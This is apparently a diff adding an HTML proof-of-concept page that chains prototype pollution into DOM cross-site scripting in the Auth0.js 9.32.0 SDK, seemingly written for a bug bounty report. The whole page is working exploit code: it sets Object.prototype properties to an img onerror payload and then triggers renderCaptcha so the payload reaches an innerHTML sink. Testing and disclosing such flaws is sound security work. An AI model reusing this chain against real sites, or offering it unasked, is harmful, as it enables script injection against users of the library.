@@ -1,0 +1,41 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Auth0.js DOM XSS & Prototype Pollution Exploit Chain</title>
+    <!-- Load the exact version flagged by The Janitor -->
+    <script src="https://cdn.auth0.com/js/auth0/9.32.0/auth0.min.js"></script>
+</head>
+<body>
+    <h1>Auth0.js SDK Prototype Pollution to DOM XSS</h1>
+    <div id="captcha-container"></div>
+
+    <script>
+        // 1. THE PROTOTYPE POLLUTION PAYLOAD
+        // We pollute the global object prototype. If the default captcha template 
+        // attempts to read an undefined property (like 'image', 'message', or 'provider')
+        // it will inherit this payload and drop it into the innerHTML sink.
+        Object.prototype.image = "<img src=x onerror=alert('DOM_XSS_VIA_PROTOTYPE_POLLUTION')>";
+        Object.prototype.message = "<img src=x onerror=alert('DOM_XSS_VIA_PROTOTYPE_POLLUTION')>";
+        Object.prototype.provider = "<img src=x onerror=alert('DOM_XSS_VIA_PROTOTYPE_POLLUTION')>";
+
+        // 2. Initialize the Auth0 client 
+        // (Replace with your dedicated bugcrowd tenant credentials)
+        var webAuth = new auth0.WebAuth({
+            domain: 'manage.cic-bug-bounty.auth0app.com', 
+            clientID: 'YOUR_TEST_CLIENT_ID'
+        });
+
+        // 3. Trigger the Captcha flow using DEFAULT templates.
+        // We pass an empty options object. If the prototype pollution is successful,
+        // the XSS will execute immediately upon rendering.
+        webAuth.renderCaptcha(
+          document.querySelector('#captcha-container'),
+          {}, 
+          function(err, result) {
+              console.log("Captcha rendered", err, result);
+          }
+        );
+    </script>
+</body>
+</html>
